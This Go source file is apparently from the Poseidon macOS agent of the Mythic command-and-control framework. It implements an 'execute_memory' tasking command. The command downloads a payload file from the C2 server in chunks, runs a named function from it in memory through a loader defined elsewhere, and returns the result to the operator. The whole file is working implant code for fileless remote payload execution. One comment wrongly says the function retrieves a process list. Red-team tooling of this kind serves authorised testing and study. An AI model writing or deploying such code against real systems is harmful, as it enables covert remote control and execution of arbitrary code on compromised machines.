package execute_memory

import (
	// Standard
	"encoding/json"
	"fmt"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// initial .m code pulled from https://github.com/its-a-feature/macos_execute_from_memory
// and https://github.com/opensource-apple/dyld/tree/master/unit-tests/test-cases/bundle-memory-load

type executeMemoryArgs struct {
	FileID       string `json:"file_id"`
	FunctionName string `json:"function_name"`
	ArgString    string `json:"args"`
}

//Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := executeMemoryArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = ""
	r.Task = &task
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	fileBytes := make([]byte, 0)

	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		} else {
			fileBytes = append(fileBytes, newBytes...)
		}
	}

	if len(fileBytes) == 0 {
		msg.SetError(fmt.Sprintf("Failed to get file"))
		task.Job.SendResponses <- msg
		return
	}
	//fmt.Printf("started run in execute_memory\n")
	var final string
	//fmt.Printf("%d\n", cap(fBytes))
	//fmt.Printf("In Run, function_name: %s\n", args.FunctionName)
	resp, _ := executeMemory(fileBytes, args.FunctionName, args.ArgString)
	//fmt.Printf("got response from executeMemory\n")
	//fmt.Printf(resp.Message)
	final = resp.Message
	if len(final) == 0 {
		final = "Function did not return data"
	}
	msg.Completed = true
	msg.UserOutput = final
	task.Job.SendResponses <- msg
	return
}
